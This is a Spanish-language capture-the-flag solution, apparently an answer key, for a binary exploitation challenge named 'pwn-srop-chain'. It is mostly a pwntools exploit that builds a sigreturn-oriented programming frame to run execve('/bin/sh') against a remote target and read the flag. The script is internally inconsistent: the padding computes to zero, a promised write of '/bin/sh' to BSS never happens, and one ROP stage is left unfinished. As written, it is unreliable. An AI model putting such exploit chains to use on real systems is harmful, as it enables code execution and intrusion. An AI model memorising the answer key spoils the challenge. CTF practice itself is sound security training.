# Solución — pwn-srop-chain

## Vulnerabilidad
Binario sin libc. Solo dos gadgets: `pop rax; ret` y `syscall; ret`.
`read(0, rsp, 1024)` → ret → jugador controla return address.

## Gadget offsets (varían según build — obtener con ROPgadget)
```
ROPgadget --binary ./vuln | grep "pop rax"
ROPgadget --binary ./vuln | grep "syscall"
```

## Exploit (pwntools)
```python
from pwn import *
import struct

HOST = '172.30.4.30'
PORT = 9998

elf = ELF('./vuln')
p = remote(HOST, PORT)

# Encontrar gadgets con ROPgadget o pwndbg
POP_RAX  = 0x40101c   # pop rax; ret
SYSCALL  = 0x40101f   # syscall; ret

# El buffer está en RSP. El jugador escribe desde RSP-8.
# Layout: [padding para llegar al return addr] [ROP chain]
# Como read lee en rsp-8, el primer qword del payload ya es la return addr.

# Ponemos /bin/sh al final del frame (conoceremos su dirección)
# RSP_AT_READ ~ dirección del buffer = RSP del proceso al momento de leer
# Necesitamos saber la dirección de RSP — el binario es no-PIE, stack ASLR activa
# Trick: el binario imprime "> " pero no da leak. Usamos el frame de sigreturn:
# el kernel restaura RSP del frame → podemos apuntar rsp a cualquier sitio.

# Paso 1: calcular offset entre inicio del buffer y return address
# (con GDB: break en ret de main, ver offset)
OFFSET = 8  # leer empieza en rsp-8, return addr está en rsp (original)

# Paso 2: construir el SROP frame
# Necesitamos la dirección donde pondremos /bin/sh en el payload
# Usamos una dirección fija en el segmento BSS o en el stack mismo

BINSH_OFFSET = 0x200  # lo ponemos 512 bytes después del inicio del payload

# Frame de rt_sigreturn para x86_64 (ver kernel/signal.c)
# Estructura: uc_flags, uc_link, uc_stack (3 fields), sigcontext (registros)
frame = SigreturnFrame()
frame.rax = 59          # SYS_execve
frame.rdi = 0           # lo calculamos dinámicamente — ver nota
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL
frame.rsp = 0xdeadbeef  # no importa tras execve

# NOTA: rdi debe apuntar a "/bin/sh\0" en memoria
# Como el stack tiene ASLR, necesitamos leak o usar una dirección fija del binario.
# Opción: poner /bin/sh en BSS (dirección fija en binario no-PIE)
# Opción 2: usar otro gadget para leer /bin/sh primero

# Exploit simplificado (asume BSS conocida):
BSS_ADDR = elf.bss()

# Stage 1: escribir /bin/sh en BSS via read(0, BSS, 8)
rop1 = flat(
    POP_RAX, 0,           # SYS_read
    # necesitamos pop rdi, pop rsi, pop rdx antes de syscall...
    # con SROP podemos configurarlos todos en el frame
)

# Exploit completo usando SROP directamente con /bin/sh en el payload:
frame.rdi = BSS_ADDR
frame.rip = SYSCALL

payload  = b'/bin/sh\x00'          # 8 bytes — irán a BSS via write anterior
payload += b'A' * (OFFSET - 8)     # padding
payload += p64(POP_RAX)
payload += p64(15)                  # rt_sigreturn
payload += p64(SYSCALL)
payload += bytes(frame)

p.recvuntil(b'> ')

# Primero: leer /bin/sh en BSS (necesita otro stage si no hay gadgets para rdi/rsi/rdx)
# Simplificación: binario tiene sección .data con /bin/sh embebida como constante
# Revisar con: strings -a ./vuln | grep /bin

p.send(payload)
p.interactive()
```

## Pasos de resolución
1. `checksec ./vuln` — confirmar no PIE, no canary, NX activo
2. `ROPgadget --binary ./vuln` — encontrar `pop rax` y `syscall`
3. `gdb ./vuln` — determinar offset al return address
4. Construir SROP frame con pwntools `SigreturnFrame()`
5. Colocar `/bin/sh` en dirección conocida (BSS o incrustada en el payload si conocemos RSP)
6. Leer flag: `cat /home/ctf/flag.txt`
